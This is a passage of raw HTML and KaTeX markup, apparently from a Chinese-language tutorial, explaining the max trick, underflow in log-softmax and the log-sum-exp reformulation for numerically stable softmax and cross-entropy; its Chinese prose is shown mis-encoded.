style="margin-right:0.10903em;">M</span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.5303em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.694em;vertical-align:-0.6567em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0374em;"><span style="top:-2.5183em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop op-symbol small-op mtight" style="position:relative;top:0em;">âˆ‘</span><span class="mspace mtight" style="margin-right:0.1952em;"/><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9595em;"><span style="top:-2.9714em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3448em;margin-left:0em;margin-right:0.1em;"><span class="pstrut" style="height:2.6595em;"/><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.5092em;"><span/></span></span></span></span></span><span class="mbin mtight">âˆ’</span><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9191em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3448em;margin-left:0em;margin-right:0.1em;"><span class="pstrut" style="height:2.6595em;"/><span class="mord mathnormal mtight">i</span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3147em;"><span/></span></span></span></span></span><span class="mbin mtight">âˆ’</span><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.6567em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></p>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ol>
<li>æœ€å¤§çš„æŒ‡æ•°é¡¹å˜ä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>e</mi><mrow><mi>M</mi><mo>âˆ’</mo><mi>M</mi></mrow></msup><mo>=</mo><msup><mi>e</mi><mn>0</mn></msup><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">e^{M-M} = e^0 = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span><span class="mbin mtight">âˆ’</span><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8141em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>ã€‚</li>
<li>å…¶ä½™æ‰€æœ‰é¡¹çš„æŒ‡æ•°éƒ¨åˆ†å‡ä¸ºè´Ÿæ•°æˆ–é›¶ï¼Œç»“æœåœ¨ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">(0, 1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mclose">]</span></span></span></span></span> ä¹‹é—´ã€‚</li>
<li>å½»åº•è§£å†³äº†ä¸Šæº¢é—®é¢˜ã€‚</li>
</ol>
<h3 data-id="heading-7">2.3 ä¸‹æº¢é—®é¢˜</h3>
<p>å³ä¾¿è§£å†³äº†ä¸Šæº¢ï¼Œå¦‚æœåœ¨è®¡ç®— Loss æ—¶å…ˆç®— Softmax å†ç®— Logï¼Œè¿˜å¯èƒ½é‡åˆ° <strong>ä¸‹æº¢</strong>ã€‚</p>
<p>å¦‚æœæŸä¸ªç±»åˆ«çš„ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>o</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">o_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> éå¸¸å°ï¼ˆè´Ÿç»å¯¹å€¼å¾ˆå¤§ï¼‰ï¼Œç»è¿‡ Softmax å <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">y_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> å¯èƒ½ä¼šæå…¶æ¥è¿‘ 0ã€‚
åœ¨æµ®ç‚¹æ•°ç²¾åº¦å—é™çš„æƒ…å†µä¸‹ï¼Œè®¡ç®—æœºå¯èƒ½ç›´æ¥å°† <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">y_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> æˆªæ–­ä¸º <strong>0</strong>ã€‚
éšåè®¡ç®— Loss æ—¶ï¼š
<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo>=</mo><mo>âˆ’</mo><mi>log</mi><mo>â¡</mo><mo stretchy="false">(</mo><mn>0</mn><mo stretchy="false">)</mo><mo>â†’</mo><mtext>inf</mtext></mrow><annotation encoding="application/x-tex">L = -\log(0) \to \text{inf}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">âˆ’</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mopen">(</span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â†’</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord text"><span class="mord">inf</span></span></span></span></span></span>
è¿™ä¼šå¯¼è‡´è®­ç»ƒæ¢¯åº¦çˆ†ç‚¸æˆ– Loss å˜ä¸ºæ— ç©·å¤§ã€‚</p>
<h3 data-id="heading-8">2.4 è§£å†³æ–¹æ¡ˆï¼šLog-Sum-Exp</h3>
<p><strong>æ ¸å¿ƒæ€æƒ³ï¼š</strong> ä¸è¦åˆ†æ­¥è®¡ç®— <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>log</mi><mo>â¡</mo><mo stretchy="false">(</mo><mtext>Softmax</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\log(\text{Softmax})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mopen">(</span><span class="mord text"><span class="mord">Softmax</span></span><span class="mclose">)</span></span></span></span></span>ï¼Œè€Œæ˜¯å°†å…¶åˆå¹¶æ¨å¯¼ï¼Œè½¬åŒ–ä¸ºä¸€ä¸ªåŸå­æ“ä½œã€‚</p>
<p><strong>æ•°å­¦æ¨å¯¼ï¼š</strong></p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>log</mi><mo>â¡</mo><mo stretchy="false">(</mo><mtext>Softmax</mtext><mo stretchy="false">(</mo><msub><mi>o</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow/><mo>=</mo><mi>log</mi><mo>â¡</mo><mrow><mo fence="true">(</mo><mfrac><msup><mi>e</mi><msub><mi>o</mi><mi>i</mi></msub></msup><mrow><munder><mo>âˆ‘</mo><mi>j</mi></munder><msup><mi>e</mi><msub><mi>o</mi><mi>j</mi></msub></msup></mrow></mfrac><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow/></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow/><mo>=</mo><mi>log</mi><mo>â¡</mo><mo stretchy="false">(</mo><msup><mi>e</mi><msub><mi>o</mi><mi>i</mi></msub></msup><mo stretchy="false">)</mo><mo>âˆ’</mo><mi>log</mi><mo>â¡</mo><mrow><mo fence="true">(</mo><munder><mo>âˆ‘</mo><mi>j</mi></munder><msup><mi>e</mi><msub><mi>o</mi><mi>j</mi></msub></msup><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow/></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow/><mo>=</mo><msub><mi>o</mi><mi>i</mi></msub><mo>âˆ’</mo><mi>log</mi><mo>â¡</mo><mrow><mo fence="true">(</mo><munder><mo>âˆ‘</mo><mi>j</mi></munder><msup><mi>e</mi><msub><mi>o</mi><mi>j</mi></msub></msup><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}
\log(\text{Softmax}(o_i)) &amp;= \log\left( \frac{e^{o_i}}{\sum_{j} e^{o_j}} \right) \\
&amp;= \log(e^{o_i}) - \log\left( \sum_{j} e^{o_j} \right) \\
&amp;= o_i - \log\left( \sum_{j} e^{o_j} \right)
\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:10.2276em;vertical-align:-4.8638em;"/><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.3638em;"><span style="top:-7.3638em;"><span class="pstrut" style="height:3.75em;"/><span class="mord"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mopen">(</span><span class="mord text"><span class="mord">Softmax</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">))</span></span></span><span style="top:-4.0638em;"><span class="pstrut" style="height:3.75em;"/><span class="mord"/></span><span style="top:-0.6em;"><span class="pstrut" style="height:3.75em;"/><span class="mord"/></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:4.8638em;"><span/></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.3638em;"><span style="top:-7.3638em;"><span class="pstrut" style="height:3.75em;"/><span class="mord"><span class="mord"/><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">(</span></span><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3414em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.162em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6065em;"><span style="top:-3.0051em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.1218em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">)</span></span></span></span></span><span style="top:-4.0638em;"><span class="pstrut" style="height:3.75em;"/><span class="mord"><span class="mord"/><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">(</span></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">âˆ‘</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">)</span></span></span></span></span><span style="top:-0.6em;"><span class="pstrut" style="height:3.75em;"/><span class="mord"><span class="mord"/><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">(</span></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">âˆ‘</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">)</span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:4.8638em;"><span/></span></span></span></span></span></span></span></span></span></span></div>
<p><strong>è¿™é‡Œçš„ Log-Sum-Exp éƒ¨åˆ†ï¼š</strong> <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>log</mi><mo>â¡</mo><mo stretchy="false">(</mo><mo>âˆ‘</mo><msup><mi>e</mi><msub><mi>o</mi><mi>j</mi></msub></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\log(\sum e^{o_j})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mopen">(</span><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>
åŒæ ·å†æ¬¡ä½¿ç”¨ Max Trick æ¥ä¿è¯è¿™ä¸€æ­¥çš„ç¨³å®šæ€§ï¼š
<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>log</mi><mo>â¡</mo><mrow><mo fence="true">(</mo><msub><mo>âˆ‘</mo><mi>j</mi></msub><msup><mi>e</mi><msub><mi>o</mi><mi>j</mi></msub></msup><mo fence="true">)</mo></mrow><mo>=</mo><mi>log</mi><mo>â¡</mo><mrow><mo fence="true">(</mo><msub><mo>âˆ‘</mo><mi>j</mi></msub><msup><mi>e</mi><mrow><msub><mi>o</mi><mi>j</mi></msub><mo>âˆ’</mo><mi>M</mi></mrow></msup><mo>â‹…</mo><msup><mi>e</mi><mi>M</mi></msup><mo fence="true">)</mo></mrow><mo>=</mo><mi>M</mi><mo>+</mo><mi>log</mi><mo>â¡</mo><mrow><mo fence="true">(</mo><msub><mo>âˆ‘</mo><mi>j</mi></msub><msup><mi>e</mi><mrow><msub><mi>o</mi><mi>j</mi></msub><mo>âˆ’</mo><mi>M</mi></mrow></msup><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\log\left( \sum_{j} e^{o_j} \right) = \log\left( \sum_{j} e^{o_j - M} \cdot e^M \right) = M + \log\left( \sum_{j} e^{o_j - M} \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.8em;vertical-align:-0.65em;"/><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.162em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.8em;vertical-align:-0.65em;"/><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.162em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing 